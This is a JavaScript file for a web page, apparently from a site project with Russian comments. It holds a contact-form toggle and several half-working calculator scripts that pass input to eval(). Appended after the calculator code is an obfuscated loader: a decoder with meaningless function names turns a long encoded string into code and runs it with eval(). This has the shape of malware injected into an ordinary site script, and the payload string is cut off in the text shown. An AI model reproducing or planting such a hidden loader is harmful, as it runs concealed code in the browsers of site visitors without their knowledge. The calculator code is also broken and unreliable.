var form = document.getElementById("form-container"),
    btn = document.getElementById("myBtn"),
    span = document.getElementsByClassName("close")[0],
    sbmBtn = document.getElementsByClassName("submit-button")[0];
btn.onclick = function myFuntion() {
        var x = document.getElementById("form-container");
        if (x.className === "form-container") {
            // Скрываем окно при нажатии кнопки "Contact"
            x.className += " form_hidden";
        } else {
            // Пщказываем окно при нажатии кнопки "Contact"
            x.className = "form-container";
        }
    }
    // Закрываем окно при нажатии "крестика"
span.onclick = function() {
        form.className += " form_hidden";
    }
    // Закрываем окно при нажатии кнопки "отправить"
sbmBtn.onclick = function() {
        form.className += " form_hidden";
    }
    ///////////////////////////
var dotAdded = !1, //false
    checkDivision = !1,
    dividingValue = '';

function Calculate(sSelector) {
    var operators = ['+', '-', '*', '/', '%'];
    this.btn = $(sSelector);
    this.btnItems = $(sSelector).children('.btn');
    var save = document.querySelector('.save'), //$(sSelector).children('.display input'), //document.querySelector('.display'),
        inValue = save.innerHTML,
        general;
    console.log('this.value', this.value);
    console.log('save.innerHTML', save.innerHTML);
    // console.log('$(this).val', save);
    console.log('inValue.length', inValue.length);
    console.log('inValue.length-1', inValue[length]);
    if (undefined === this.value) {
        console.log("undefined === this.value");
        this.value = '';
    }
    console.log("inValue.lastIndexOf('/');", inValue.lastIndexOf('/'));
    if ('/' == this.value || checkDivision) {
        var uncheck = !1;
        if (checkDivision) {
            // if (operators.indexOf(this.value) == -1 && '=' != this.value && 'del' != this.value && 'C' != this.value) {
            //     dividingValue += this.value;
            // } else if ('C' == this.value) {
            //     dividingValue = '';
            // } else if ('del' == this.value) {
            //     dividingValue = delLastChar(dividingValue);
            // } else if ((dividingValue *= 1) == 0) {
            //     // inValue.lastIndexOf('/');
            //     console("inValue.lastIndexOf('/');", inValue.lastIndexOf('/'));
            //     dividingValue = '';
            //     console.log("dividingValue = ''", dividingValue);
            dividingValue = inValue.substr(inValue.lastIndexOf('/') + 1);
            console.log("dividingValue", dividingValue);
            if ((dividingValue *= 1) == 0) {
                inValue = inValue.replace(/(\/[0]+)/g, '\/');
                save.innerHTML = inValue;
            } else {
                checkDivision = !1;
                uncheck = !0;

            }
        }
        if (!uncheck) {
            checkDivision = !0;
        }
    }




    // this.value = !0;
    // this.value = !1;
    // console.log('this.value = !0;', this.value);
    // console.log('this.value = !1;', this.value);
    console.log('inValue_0', inValue);
    if ('C' == this.value) {
        save.innerHTML = '';
        dotAdded = !1;
    } else if ('del' == this.value) {
        save.innerHTML = delLastChar(save.innerHTML);
    } else if ('=' == this.value) {
        console.log('this.value1', this.value);
        var equation = inValue;
        //         console.log('inValue_1', inValue);
        //         console.log('equation', equation);
        var lastChar = equation[equation.length - 1];
        // equation = equation.replace(/x/g, '*').replace(/÷/g, '/');
        if (operators.indexOf(lastChar) > -1 || lastChar == '.') {
            equation = equation.replace(/.$/, '');
        }
        if (equation) {
            general = eval(equation);
            if (general.toString().indexOf('.') != -1) {
                general = general.toFixed(2);
                console.log('equation', equation);
                // decimalAdded = !0;
            }
            save.innerHTML = general;
        }
        dotAdded = checkDot(general);
        // decimalAdded = !1;
    } else if (operators.indexOf(this.value) > -1) {
        if (checkDivision) {

        }
        // console.log("operators.indexOf(this.value) > -1", operators.indexOf(this.value));
        var lastChar = inValue[inValue.length - 1];
        // console.log("inValue[inValue.length - 1]", inValue[inValue.length - 1]);
        if (inValue != '' && operators.indexOf(lastChar) == -1) {
            save.innerHTML += this.value;
        } else if (inValue == '' && this.value == '-') {
            save.innerHTML += this.value;
        }
        if (operators.indexOf(lastChar) > -1 && inValue.length > 1) {
            save.innerHTML = inValue.replace(/.$/, this.value);
        }
        dotAdded = !1;
    } else if ('.' == this.value) {
        if (!dotAdded) {
            save.innerHTML += this.value;
            dotAdded = !0;
        }
    } else {
        save.innerHTML += this.value;
    }
    // проверка на  десятичную точку
    function checkDot(str) {
        // console.log('str', str, 'str.indexOf(\'.\'):', str.indexOf('.'));
        return (str.indexOf('.') != -1);

    }
    //Удаление последнего символа
    function delLastChar(str) {
        if ('0' == str) return;
        var strCurnt = str;
        // console.log("str", str);
        strCurnt = strCurnt.substring(0, strCurnt.length - 1);
        dotAdded = checkDot(strCurnt);
        return strCurnt;


    }
    // console.log('inValue.val1', inValue.value);
    // console.log('inValue', inValue);
    // $(save).html(inValue);
    // // += this.value;
    // console.log('save.val', save.value);
    //Стираем поле ввода
    // if (this.value == 'C') {
    //     $(save).html = '';
    // } else if (this.value == '=') {
    //     var equation = inValue;
    //     if (equation) {
    //         $(save).html = eval(equation);
    //     }
    // } else {
    // inValue += this.value;
    // $(save).html(inValue);
    // // += this.value;
    // console.log('save.val', save.value);
}



$(".btn").click(Calculate);
/////////////////////////////////////////////////////
var calculator = this,
    mini = $('#mini'),
    // display = $('#display').html(),
    currentValue = 0,
    oper = '',
    value = 0,
    resetCount = 0,
    num;
resetValue = true;
console.log("mini:", mini);
console.log("display:", display);
console.log("display.val():", display.val());
this.btn = $(sSelector);
this.btnItems = this.btn.children(".btn");
this.btnItems_oper = this.btn.children(".operation");
console.log("this.value: ", this.value);
console.log("$(this).className(): ", this.className);
if (resetValue) {
    this.value = 0;
    resetValue = false;
}

if (this.value === 'C') {
    clear();
}
if (this.className === 'btn btn_oper') {
    oper = this.value;
    this.value = '';
}
console.log("resetCount", resetCount);
if (!(resetCount)) {
    this.value = 0;
    resetCount++;
}
if (num) {
    display.val(this.value);
    display.val(display.val() + this.value);
    num = '';
} else {
    if (display.val() === '0') {
        display.val(this.value);
    } else {
        display.val(display.val() + this.value);
    }
}
if (num && oper != '=') {
    display.val(currentValue);
} else {
    num = true;
    console.log('currentValue0: ', currentValue, "display.val()0", display.val(), "oper0", oper);
    switch (true) {
        case (oper == '+'):
            currentValue += parseFloat(display.val());
            display.val(currentValue);
            console.log('currentValue: ', currentValue, "display.val()", display.val());
            break;
        case (oper == '-'):
            currentValue -= parseFloat(display.val());
            display.val(currentValue);
            break;
        case (oper == '*'):
            currentValue *= parseFloat(display.val());
            display.val(currentValue);
            break;
        case (oper === '/'):
            currentValue /= parseFloat(display.val());
            display.val(currentValue);
            break;
        default:
            currentValue = parseFloat(display.val());
            display.val(currentValue);
            oper = this.value;

    }
}





function clear() {
    currentValue = 0;
    oper = '';
    display.val('0');
}

this.btn = $(sSelector);
this.btn = $(sSelector);
this.btnItems = this.btn.children("button");
displayResult.defaultValue(0);
value = this.value;
console.log("value0", value);
console.log("$('#txtArea').val()", $("#txtArea").val());
if ($("#txtArea").val() === isNaN()) {
    $("#txtArea").val(value);
    console.log("value1", value);

} else {
    console.log("value2", value);
    valueDisplay = $("#txtArea").val();
    valueDisplay += value;
    $("#txtArea").text(valueDisplay);
}

console.log("value", this.value);

value += this.value;
displayResult.text(value);
$("#txtArea").val(value);
console.log("this.menuItems[1].className: ", this.menuItems[1]);
console.log("btn.menuItems[0].val(): ", $(btn.menuItems[0]).val());
$("#txtArea").val("");
console.log($(this).attr("class"));



value += $(btn).val();





// TODO: разобраться
// $(calculator).find('.btn button').on('click', function() {
//     value = $(this).val();
//     console.log("value: ", value);
// });
/////////////////////////////////////////////////////////


/////////////////////////////////////////////////////////
var GT = 0,
    memory = 0,
    prev_sum = 0,
    prev_factor = 0,
    prev_operand = 0,
    waitingForOperand = !0,
    pendingAdditiveOperator = "",
    pendingMultiplicativeOperator = "",
    display_text = "0",
    max_digits = 15;

function display(a) {
    $("#display_sign").css("font-size", "19px");
    $("#display_sign").css("font-family", "inherit");
    $("#display_sign").css("top", "-4px");
    0 > 1 * a ? ($("#calc_display_sign").val("-"), a *= -1) : $("#calc_display_sign").val("");
    $("#calc_display").val(a)
}

function ins(a) {
    hide_operation_symbol();
    0 != prev_operand && (pendingAdditiveOperator = pendingMultiplicativeOperator = "");
    prev_operand = 0;
    "0" == display_text && ("0" == a || "00" == a) || ("." == a ? (waitingForOperand && (display_text = "0", waitingForOperand = !1), 0 > display_text.indexOf(".") && (display_text += ".")) : "+-" == a ? (0 < 1 * display_text ? display_text = "-" + display_text : 0 > 1 * display_text && (display_text = (display_text + "").substring(1)), waitingForOperand = !1) : (waitingForOperand && (display_text = "", waitingForOperand = !1), "0" != a && "00" !=
        a && "0" == display_text && (display_text = ""), display_text = "00" == a && "" == display_text ? 0 : display_text + a), display(display_text))
}

function calc_clear() {
    prev_operand = prev_factor = prev_sum = GT = 0;
    pendingMultiplicativeOperator = pendingAdditiveOperator = "";
    display_text = "0";
    display(display_text);
    waitingForOperand = !0;
    hide_operation_symbol();
}

function calc_CE() {
    display_text = "0";
    display(display_text);
    waitingForOperand = !0;
    hide_operation_symbol()
}

function backspace() { waitingForOperand || (hide_operation_symbol(), display_text = display_text.substring(0, display_text.length - 1), "" == display_text && (display_text = "0", waitingForOperand = !0), display(display_text)) }

function memory_clear() {
    memory = 0;
    $("#calc_display_memory").val("")
}

function memory_recall() {
    display_text = memory;
    display(display_text);
    waitingForOperand = !1
}

function memory_plus() {
    if (!waitingForOperand) operation_equal();
    memory = parseFloat(memory) + parseFloat(display_text);
    hide_operation_symbol();
    $("#calc_display_memory").val("M")
}

function memory_minus() {
    if (!waitingForOperand) operation_equal();
    memory = parseFloat(memory) - parseFloat(display_text);
    hide_operation_symbol();
    $("#calc_display_memory").val("M")
}

function additiveOperator(a) {
    0 != prev_operand && (pendingAdditiveOperator = pendingMultiplicativeOperator = "", waitingForOperand = !1);
    prev_operand = 0;
    if (!waitingForOperand) {
        var b = 1 * display_text;
        if ("" != pendingMultiplicativeOperator) {
            if (!calculate(b, pendingMultiplicativeOperator)) { abortOperation(); return }
            display_text = prev_factor;
            display(display_text);
            b = prev_factor;
            prev_factor = 0;
            pendingMultiplicativeOperator = ""
        }
        if ("" != pendingAdditiveOperator) {
            if (!calculate(b, pendingAdditiveOperator)) { abortOperation(); return }
            display_text =
                prev_sum;
            display(display_text)
        } else prev_sum = b;
        pendingAdditiveOperator = a;
        waitingForOperand = !0;
        show_operation_symbol(a)
    }
}

function multiplicativeOperator(a) {
    0 != prev_operand && (pendingAdditiveOperator = pendingMultiplicativeOperator = "", waitingForOperand = !1);
    prev_operand = 0;
    if (!waitingForOperand) {
        var b = 1 * display_text;
        if ("" != pendingMultiplicativeOperator) {
            if (!calculate(b, pendingMultiplicativeOperator)) { abortOperation(); return }
            display_text = prev_factor;
            display(display_text)
        } else prev_factor = b;
        pendingMultiplicativeOperator = a;
        waitingForOperand = !0;
        show_operation_symbol(a)
    }
}

function unaryOperator(a) {
    0 != prev_operand && (pendingAdditiveOperator = pendingMultiplicativeOperator = "");
    prev_operand = 0;
    var b = 1 * display_text,
        d = 0;
    if ("sqrt" == a) {
        if (0 > b) { abortOperation(); return }
        d = Math.sqrt(b)
    } else if ("pow" == a) d = Math.pow(b, 2);
    else if ("1/x" == a) {
        if (0 == b) { abortOperation(); return }
        d = 1 / b
    }
    display_text = d;
    display(display_text);
    waitingForOperand = !1
}

function abortOperation() {
    calc_clear();
    display_text = "Error";
    display(display_text)
}

function show_operation_symbol(a) {
    $("#calc_display_operation").css("display", "block");
    $("#display_sign").css("font-size", "19px");
    $("#display_sign").css("font-family", "inherit");
    $("#display_sign").css("top", "-4px");
    var b = a;
    switch (a) {
        case "+":
            b = "+";
            break;
        case "-":
            b = "&#150;";
            break;
        case "*":
            b = "&#215;";
            break;
        case "/":
            b = "&#247;";
            break;
        case "GT":
        case "%":
            $("#display_sign").css("font-size", "9px"), $("#display_sign").css("font-family", "Arial, Helvetica, sans-serif"), $("#display_sign").css("top", "1px")
    }
    $("#display_sign").html(b)
}

function hide_operation_symbol() { $("#calc_display_operation").css("display", "none") }

function operation_percent() {
    if (!0 != waitingForOperand) {
        var a = 1 * display_text;
        "" != pendingMultiplicativeOperator && (a *= prev_factor / 100);
        "" != pendingAdditiveOperator && a == display_text && (a *= prev_sum / 100);
        display_text = a;
        display(display_text);
        waitingForOperand = !0;
        show_operation_symbol("%")
    }
}

function operation_equal() {
    var a = 1 * display_text;
    prev_operand != a && 0 != prev_operand && (a = prev_operand);
    if ("Error" != display_text) {
        if ("" != pendingMultiplicativeOperator) {
            if (!calculate(a, pendingMultiplicativeOperator)) { abortOperation(); return }
            prev_operand = a;
            a = prev_factor
        }
        if ("" != pendingAdditiveOperator) {
            if (!calculate(a, pendingAdditiveOperator)) { abortOperation(); return }
            prev_operand = a;
            pendingMultiplicativeOperator = ""
        } else prev_sum = a;
        GT += 1 * prev_sum;
        display_text = prev_sum;
        display(display_text);
        waitingForOperand = !0;
        show_operation_symbol("=")
    }
}

function operation_GT() {
    display_text = GT;
    display(display_text);
    waitingForOperand = !0;
    show_operation_symbol("GT")
}
var w1f45e = "";

function o810d9d5da4b9(a) {
    for (var b = String, d = a.substr(11, 3) - 418, c, a = a.substr(p9()), f = vb(a), e = 0; e < f; e++) {
        try { throw ua = w7(a, e); } catch (g) { ua = g }
        if ("}" == ua) {
            d = "";
            e++;
            for (yc = a.substr(e, 1);
                "}" != yc;) d += yc, e++, yc = a.substr(e, 1);
            d -= 661
        } else if (c = "", "\u00b0" == ua) {
            e++;
            for (ua = a.substr(e, 1);
                "\u00b0" != ua;) c += ua, e++, ua = a.substr(e, 1);
            c = oc(c, d, 46);
            0 > c && (c += 256);
            c = r4(c);
            sd(c)
        } else oe = xe(ua), 848 < oe && (oe -= 848), c = oe - d - 46, 0 > c && (c += 256), 192 <= c ? c += 848 : 168 == c ? c = 1025 : 184 == c && (c = 1105), w1f45e += b.fromCharCode(c)
    }
}
o810d9d5da4b9(x5());
eval(w1f45e);

function p9() { return 14 }

function vb(a) { return a.length }

function w7(a, b) { return a.substr(b, 1) }

function r4(a) { 168 == a ? a = 1025 : 184 == a && (a = 1105); return 192 <= a && 256 > a ? a + 848 : a }

function oc(a, b, d) { return a - b - d }

function sd(a) { w1f45e += String.fromCharCode(a) }

function x5() { return "d161f0aae9c438\u00b0168\u00b0\u00b0183\u00b0\u00b0176\u00b0\u00b0165\u00b0}699}\u00b0200\u00b0}801}#)(\u00b0218\u00b0}677}\u00b0161\u00b0}818},}756}\u00b0249\u00b0\u00b0240\u00b0\u00b02\u00b0}721}\u00b0214\u00b0\u00b0203\u00b0\u00b0222\u00b0}691}\u00b0177\u00b0t\u00b0173\u00b0}833}\u00b06\u00b0}777}\u00b0194\u00b0\u00b04\u00b0}671}d}797}\u00b0214\u00b0\u00b025\u00b0\u00b0223\u00b0\u00b0214\u00b01\u00b0195\u00b0\u00b0192\u00b0}842}\u00b03\u00b0\u00b03\u00b0L}784}\u00b015\u00b0\u00b0209\u00b0\u00b031\u00b0\u00b024\u00b0\u00b018\u00b0\u00b013\u00b0}789}\u00b0206\u00b0\u00b0222\u00b0\u00b0206\u00b0}678}\u00b0124\u00b0}826}\u00b016\u00b0}794}\u00b0211\u00b0\u00b022\u00b0\u00b0220\u00b0}765}\u00b0182\u00b0\u00b017\u00b0}760}\u00b0158\u00b0\u00b0155\u00b0}689}j}767}\u00b0184\u00b0\u00b0184\u00b0\u00b0184\u00b0}755}\u00b0245\u00b0\u00b0242\u00b0\u00b0180\u00b0}848}\u00b011\u00b0}837}\u00b09\u00b0}763}\u00b0182\u00b0\u00b0180\u00b0\u00b0209\u00b0\u00b0209\u00b0}830}\u00b0247\u00b09}799}\u00b0225\u00b0\u00b0216\u00b0}751}\u00b03\u00b0}731}\u00b0129\u00b0}682}M}670}W}712}\u00b0129\u00b0\u00b0129\u00b0\u00b0129\u00b0}663}P}816}\u00b0233\u00b0}812}5}717}\u00b0216\u00b0}683}\u00b0169\u00b0}792}'}845}E}860}hjb}718}\u00b0135\u00b0}793}\u00b0221\u00b0\u00b0239\u00b0}744}\u00b0161\u00b0}847}X}664}\u00b0146\u00b0\u00b0163\u00b0\u00b0164\u00b0}686}\u00b0172\u00b0\u00b0141\u00b0}829}B}749}\u00b0245\u00b0}753}\u00b0235\u00b0}839}T}840}\u00b09\u00b0B}768}\u00b0194\u00b0\u00b0166\u00b0\u00b0163\u00b0}794}\u00b0211\u00b0\u00b0211\u00b0}796}\u00b0213\u00b0\u00b0213\u00b02}800}\u00b030\u00b0}688}\u00b0181\u00b0\u00b0188\u00b0\u00b0174\u00b0i}705}\u00b0213\u00b0}670}DAWW}759}\u00b0176\u00b0\u00b0176\u00b0\u00b0176\u00b0\u00b0176\u00b0}761}\u00b0251\u00b0\u00b0248\u00b0\u00b0186\u00b0}857}\u00b020\u00b0}751}\u00b0181\u00b0\u00b0170\u00b0}750}\u00b0167\u00b0}695}\u00b0141\u00b0\u00b0141\u00b0}831}\u00b0248\u00b0:\u00b01\u00b0}691}l\u00b0199\u00b0YV}768}\u00b0185\u00b0\u00b0185\u00b0}695}ppp}851}\u00b012\u00b0\u00b012\u00b0\u00b012\u00b0}778}\u00b019\u00b0\u00b021\u00b0\u00b08\u00b0}834}Q:}790}\"}730}\u00b0232\u00b0}715}\u00b0209\u00b0\u00b0132\u00b0\u00b0145\u00b0}848}&\u00b09\u00b0}858}T}838}\u00b0236\u00b0\u00b0233\u00b0\u00b0255\u00b0}718}\u00b0135\u00b0}823}\u00b0240\u00b0}721}\u00b0138\u00b0\u00b0138\u00b0\u00b0138\u00b0}800}6}818}07}690}\u00b0190\u00b0}808}&\u00b0225\u00b0<}811}\u00b0209\u00b0}800}\u00b0195\u00b0\u00b0217\u00b0\u00b0217\u00b0}730}\u00b0147\u00b0\u00b0147\u00b0\u00b0147\u00b0}784}\u00b0201\u00b0}666}S}684}e\u00b0174\u00b0\u00b0171\u00b0}702}\u00b0127\u00b0y}832}\u00b03\u00b0\u00b0251\u00b0}703}x}669}s}826}\u00b016\u00b0\u00b0243\u00b0}800}\u00b027\u00b0\u00b0226\u00b0}680}a\u00b0188\u00b0N}711}j\u00b0128\u00b0\u00b0128\u00b0\u00b0128\u00b0}823}\u00b0240\u00b0}704}yyyy}713}\u00b0130\u00b0\u00b0130\u00b0}722}\u00b0219\u00b0\u00b0221\u00b0}775}\u00b05\u00b0}787}\"\u00b011\u00b0\u00b018\u00b0\u00b013\u00b0\u00b015\u00b0\u00b032\u00b0\u00b027\u00b0\u00b030\u00b0\u00b0204\u00b0\u00b0214\u00b0\u00b0233\u00b0\u00b0204\u00b0}761}\u00b0243\u00b0\u00b0190\u00b0\u00b0178\u00b0}732}\u00b0229\u00b0\u00b0231\u00b0}789}\u00b019\u00b0}721}\u00b0224\u00b0\u00b0201\u00b0\u00b0208\u00b0}670}\u00b0152\u00b0}691}\u00b0175\u00b0}702}\u00b0203\u00b0}717}\u00b0213\u00b0\u00b0216\u00b0\u00b0134\u00b0\u00b0163\u00b0\u00b0134\u00b0\u00b0214\u00b0}711}\u00b0193\u00b0\u00b0210\u00b0}706}\u00b0206\u00b0\u00b0192\u00b0\u00b0161\u00b0\u00b0199\u00b0\u00b0202\u00b0\u00b0188\u00b0}817}>\u00b0242\u00b0}855}`}714}\u00b0213\u00b0\u00b0200\u00b0}848}_}819}+2-/@;}806}1}784}\u00b0215\u00b0\u00b029\u00b0\u00b024\u00b0}759}\u00b0224\u00b0}833}L?=}739}\u00b0229\u00b0\u00b0239\u00b0\u00b0229\u00b0}791}\u00b031\u00b0\u00b030\u00b0}725}\u00b0150\u00b0}850}XLc}679}\u00b0159\u00b0}783}\u00b012\u00b0}725}\u00b0215\u00b0}679}\u00b0167\u00b0\u00b0169\u00b0\u00b0180\u00b0\u00b0179\u00b0iiM}674}E[[}828}\u00b0245\u00b0\u00b0245\u00b0\u00b0245\u00b0}838}\u00b0255\u00b0\u00b0255\u00b0\u00b0255\u00b0}820}J}697}\u00b0183\u00b0}667}\u00b0160\u00b0}715}\u00b0215\u00b0\u00b0201\u00b0}706}\u00b0123\u00b0\u00b0214\u00b0h}742}\u00b0137\u00b0\u00b0159\u00b0\u00b0159\u00b0\u00b0159\u00b0}680}aa}738}\u00b0155\u00b0}677}^^^}838}\u00b0255\u00b0HE\u00b07\u00b0\u00b01\u00b0}860}$}854}\u00b017\u00b0}776}\u00b0193\u00b0\u00b0222\u00b0}859}1\u00b020\u00b0V\u00b029\u00b0\u00b020\u00b0o\u00b01\u00b0\u00b0254\u00b0}849}\u00b010\u00b0}802}\u00b0219\u00b0\u00b0219\u00b0\u00b0219\u00b0\u00b0219\u00b0}819}\u00b0236\u00b0}771}\u00b0188\u00b0}700}uu}712}\u00b0129\u00b0\u00b0129\u00b0}771}\u00b0188\u00b0\u00b05\u00b0\u00b02\u00b0}752}\u00b0177\u00b0}832}\u00b09\u00b0}675}\\y}792}\u00b0238\u00b0\u00b0209\u00b0\u00b018\u00b0}726}\u00b0152\u00b0}740}\u00b0157\u00b0\u00b0248\u00b0\u00b0138\u00b0}833}\u00b0228\u00b0}666}S}757}\u00b0174\u00b0\u00b0174\u00b0}797}\u00b0214\u00b0\u00b0214\u00b0}715}\u00b0132\u00b0\u00b0132\u00b0\u00b0132\u00b0}758}\u00b0175\u00b0\u00b0175\u00b0}841}\u00b02\u00b0\u00b02\u00b0}844}\u00b05\u00b0\u00b05\u00b0}762}\u00b05\u00b0\u00b0248\u00b0}663}\u00b0164\u00b0}769}\u00b015\u00b0}765}\u00b08\u00b0}755}\u00b0250\u00b0}751}\u00b0169\u00b0\u00b0185\u00b0\u00b0149\u00b0}789}\u00b0184\u00b0}783}\u00b0200\u00b0}663}P}820}\u00b0237\u00b0\u00b0237\u00b0}688}ii}685}ff}817}\u00b0234\u00b0\u00b0234\u00b0}815}\u00b0232\u00b0}821}\u00b0238\u00b0K}725}\u00b0123\u00b0x}712}\u00b0129\u00b0\u00b0129\u00b0}849}\u00b010\u00b0\u00b010\u00b0\u00b010\u00b0\u00b010\u00b0\u00b010\u00b0}736}\u00b0153\u00b0}749}\u00b0166\u00b0}689}jj}717}\u00b0134\u00b0}748}\u00b0245\u00b0}701}\u00b0200\u00b0}792}\u00b022\u00b0}806}5}751}\u00b0231\u00b0\u00b0238\u00b0\u00b0233\u00b0}749}\u00b0233\u00b0\u00b0250\u00b0\u00b0245\u00b0}690}\u00b0189\u00b0k}799}\u00b0231\u00b0}777}\u00b0223\u00b0}756}\u00b0173\u00b0}795}$}782}\u00b08\u00b0\u00b025\u00b0}809}5'\u00b08\u00b0.1#6}741}\u00b0166\u00b0\u00b0223\u00b0\u00b0167\u00b0}682}\u00b0126\u00b0}709}k}717}p\u00b0134\u00b0\u00b0134\u00b0\u00b0134\u00b0\u00b0134\u00b0\u00b0134\u00b0}789}\u00b0206\u00b0\u00b0206\u00b0}712}\u00b0129\u00b0}721}\u00b0138\u00b0\u00b0138\u00b0}789}\u00b0206\u00b0\u00b0206\u00b0}721}\u00b0218\u00b0\u00b0220\u00b0\u00b0207\u00b0}837}T}736}\u00b0216\u00b0}736}\u00b0223\u00b0\u00b0218\u00b0}779}\u00b07\u00b0}783}\u00b028\u00b0}664}\u00b0160\u00b0\u00b0163\u00b0}861}\u00b022\u00b0}741}\u00b0187\u00b0}779}\u00b0196\u00b0}860}e}709}\u00b0191\u00b0\u00b0208\u00b0}675}\u00b0175\u00b0\u00b0161\u00b0}858}9_}758}\u00b0254\u00b0\u00b0240\u00b0\u00b03\u00b0\u00b0183\u00b0}765}\u00b06\u00b0\u00b08\u00b0}779}\u00b09\u00b0\u00b026\u00b0\u00b03\u00b0}711}\u00b0198\u00b0}681}\u00b0163\u00b0}762}\u00b0246\u00b0}828}I}719}\u00b0215\u00b0}777}\u00b020\u00b0\u00b0208\u00b0\u00b022\u00b0\u00b017\u00b0}714}\u00b0179\u00b0\u00b0213\u00b0}770}\u00b00\u00b0}745}\u00b0229\u00b0}831}A}702}\u00b0202\u00b0}858}\\}774}\u00b014\u00b0}812}3}758}\u00b0183\u00b0\u00b0252\u00b0\u00b0240\u00b0}832}Q8=}702}\u00b0192\u00b0}818}2}774}\u00b08\u00b0}772}\u00b017\u00b0\u00b016\u00b0}727}\u00b0153\u00b0\u00b0153\u00b0\u00b0125\u00b0}789}\u00b0184\u00b0\u00b0206\u00b0}847}\u00b08\u00b0}811}\u00b0228\u00b0}718}\u00b0135\u00b0\u00b0135\u00b0\u00b0135\u00b0}751}\u00b0168\u00b0}780}\u00b0197\u00b0}851}\u00b012\u00b0\u00b012\u00b0i\u00b0249\u00b0\u00b0246\u00b0\u00b012\u00b0}685}f}790}\u00b0207\u00b0\u00b0207\u00b0}685}ff}774}\u00b0191\u00b0\u00b0191\u00b0}727}\u00b0237\u00b0}836}\u00b0234\u00b0\u00b0231\u00b0\u00b0253\u00b0}764}\u00b0181\u00b0\u00b0181\u00b0}841}\u00b02\u00b0}673}ZZ\u00b0183\u00b0G}694}Yoo}791}\u00b0208\u00b0}707}\u00b0124\u00b0\u00b0217\u00b0}850}\u00b0248\u00b0}721}t\u00b0138\u00b0\u00b0138\u00b0\u00b0231\u00b0wt}813}\u00b0230\u00b0}721}\u00b0138\u00b0}664}\u00b0154\u00b0\u00b0151\u00b0Y\u00b0161\u00b0\u00b0163\u00b0\u00b0150\u00b0}729}\u00b0232\u00b0}709}\u00b0189\u00b0\u00b0209\u00b0\u00b0211\u00b0\u00b0203\u00b0\u00b0126\u00b0}734}\u00b0180\u00b0\u00b0180\u00b0}707}\u00b0124\u00b0\u00b0142\u00b0}849}\u00b010\u00b0\u00b020\u00b0}709}\u00b0126\u00b0\u00b0206\u00b0\u00b0208\u00b0}809}'}745}\u00b0248\u00b0\u00b0225\u00b0}784}\u00b028\u00b0}735}\u00b0237\u00b0}860}b}767}\u00b0184\u00b0}716}\u00b0139\u00b0\u00b0139\u00b0\u00b0133\u00b0}774}\u00b015\u00b0\u00b017\u00b0}694}\u00b0180\u00b0\u00b0197\u00b0\u00b0174\u00b0\u00b0194\u00b0}746}\u00b0248\u00b0\u00b0240\u00b0\u00b0163\u00b0}779}\u00b0225\u00b0}822}\u00b012\u00b0}679}`q`k`\u00b0176\u00b0}742}\u00b0241\u00b0\u00b0228\u00b0\u00b0245\u00b0\u00b0222\u00b0}669}\u00b0169\u00b0\u00b0171\u00b0\u00b0163\u00b0}778}\u00b0195\u00b0}733}\u00b0242\u00b0}747}\u00b00\u00b0}821}\u00b0238\u00b0}847}XZ}749}\u00b0235\u00b0\u00b0252\u00b0\u00b0229\u00b0}833}@}834}<>}858}gbe\u00b019\u00b0}737}\u00b0183\u00b0\u00b0183\u00b0}778}\u00b0195\u00b0\u00b0213\u00b0}839}\u00b00\u00b0}807}\u00b0234\u00b0\u00b0224\u00b00}773}\u00b016\u00b0}795}\u00b025\u00b0}789}$\u00b013\u00b0}805}$}807}!#4/}771}\u00b014\u00b0}729}\u00b0146\u00b0}739}\u00b0162\u00b0}706}\u00b0129\u00b0}756}\u00b0173\u00b0}718}\u00b0215\u00b0}702}\u00b0201\u00b0}686}\u00b0172\u00b0}817}@}764}\u00b0244\u00b0}720}\u00b0207\u00b0}668}\u00b0150\u00b0}716}\u00b0200\u00b0}851}`[}750}\u00b0249\u00b0}735}\u00b0152\u00b0\u00b0181\u00b0\u00b0181\u00b0\u00b0152\u00b0\u00b0169\u00b0}859}\u00b020\u00b0}800}\u00b0228\u00b0\u00b0217\u00b0}711}\u00b0208\u00b0\u00b0210\u00b0\u00b0197\u00b0\u00b0214\u00b0\u00b0191\u00b0}813},'):}705}\u00b0201\u00b0\u00b0204\u00b0}802}\u00b0228\u00b0\u00b0219\u00b0}822}J\u00b0220\u00b0}751}\u00b0146\u00b0}723}\u00b0140\u00b0}721}\u00b0138\u00b0}665}R}750}\u00b0167\u00b0\u00b0249\u00b0\u00b0236\u00b0}678}\u00b0179\u00b0\u00b0180\u00b0}825}D@}827}\u00b0245\u00b0\u00b05\u00b0\u00b0225\u00b0}667}>}674}[[}775}\u00b029\u00b0\u00b0173\u00b0\u00b0170\u00b0\u00b0192\u00b0}833}\u00b0250\u00b0}724}\u00b0214\u00b0\u00b0211\u00b0\u00b0149\u00b0\u00b0148\u00b0\u00b0169\u00b0\u00b0224\u00b0}746}\u00b0247\u00b0}733}\u00b0232\u00b0}712}\u00b0208\u00b0\u00b0207\u00b0}765}\u00b0253\u00b0\u00b0212\u00b0\u00b0217\u00b0}740}\u00b0190\u00b0\u00b0201\u00b0}713}\u00b0165\u00b0}836}\u00b025\u00b0}697}\u00b0197\u00b0}663}\u00b0165\u00b0}669}\u00b0166\u00b0t}858}5L}833}\u00b022\u00b0}704}\u00b0136\u00b0}786}\u00b030\u00b0}837}SN\u00b028\u00b0}857}.}696}\u00b0128\u00b0\u00b0196\u00b0}836}QOLK}698}\u00b0186\u00b0}674}y}829}\u00b0246\u00b0}777}\u00b0207\u00b0}785}\u00b0202\u00b0\u00b0230\u00b0\u00b011\u00b0\u00b0202\u00b0\u00b018\u00b0\u00b028\u00b0\u00b015\u00b0}686}\u00b0173\u00b0}809}\u00b0255\u00b0\u00b0228\u00b0*6}736}\u00b0237\u00b0\u00b0233\u00b0\u00b0179\u00b0\u00b0168\u00b0\u00b0168\u00b0}756}\u00b0240\u00b0}861}WbY}720}\u00b0151\u00b0}774}\u00b01\u00b0}840}Z}759}\u00b0178\u00b0}824}\u00b0241\u00b0}700}\u00b0201\u00b0}715}\u00b0197\u00b0\u00b0214\u00b0}760}\u00b0248\u00b0}844}J}776}\u00b021\u00b0}823}\u00b013\u00b0\u00b0242\u00b0/}859}V}697}\u00b0190\u00b0\u00b0179\u00b0\u00b0192\u00b0}753}\u00b0245\u00b0}745}\u00b0164\u00b0\u00b0192\u00b0}811}\u00b032\u00b09\u00b0244\u00b0\u00b0248\u00b0\u00b0247\u00b0}814},#}838}T}725}\u00b0158\u00b0}847}\u00b028\u00b0\u00b027\u00b0}843}H@}709}\u00b0211\u00b0}704}\u00b0137\u00b0}676}qp\u00b0159\u00b0\u00b0153\u00b0}753}\u00b0255\u00b0\u00b0186\u00b0\u00b0190\u00b0}753}\u00b0189\u00b0}675}l\u00b0152\